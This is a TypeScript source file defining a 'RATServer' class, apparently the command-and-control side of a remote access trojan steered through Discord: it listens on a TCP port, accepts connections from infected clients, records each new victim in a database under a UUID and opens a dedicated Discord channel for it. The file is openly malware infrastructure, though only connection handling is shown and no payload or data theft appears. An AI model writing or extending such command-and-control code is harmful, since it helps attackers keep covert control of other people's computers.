import {createServer, Server, Socket} from 'net';
import CustomClient from './CustomClient';
import ITCPServer from "../interfaces/IRATServer";
import RATClient from './RATClient';
import { ChannelType } from 'discord.js';

export default class RATServer implements ITCPServer {
    client: CustomClient;
    host: string;
    port: number;
    ratClients: RATClient[];
    server: Server;
    started: boolean = false;
    
    constructor(client: CustomClient) {
        this.client = client;
        this.ratClients = new Array<RATClient>();
        this.host = client.config.tcpHost;
        this.port = client.config.tcpPort;
        this.server = createServer();
    }
    
    start(): void {
        this.server.listen(this.port, this.host, () => {
            this.started = true;
            console.log(`RAT TCP serv er started on ${this.host}:${this.port}`);
        });
        this.server.on('connection', async (socket: Socket) => {
            // create client object and adds it to the clients array
            let client = new RATClient(socket, this);
            this.ratClients.push(client);

            let data = await client.receive();
            // if first time client connects, create a new user
            if (data == 0) {
                const user = await this.client.database.user.create({
                    data: {
                        name: null
                    }
                });
                client.send(user.uuid);
                // Create a channel in a category using category ID
                const guild = this.client.guilds.cache.get(this.client.config.guildId) || null;
                if (!guild) {
                    console.log(`Guild with ID ${this.client.config.guildId} not found`);
                    return;
                }
                const channel = await guild.channels.create({
                    name: user.uuid,
                    type: ChannelType.GuildText,
                    parent: this.client.config.categoryId
                });
            }
        });
    }
    
    stop(): void {
        console.log(`Server stopped on ${this.host}:${this.port}`);
    }

    isListening(): boolean {
        return this.started;
    }
}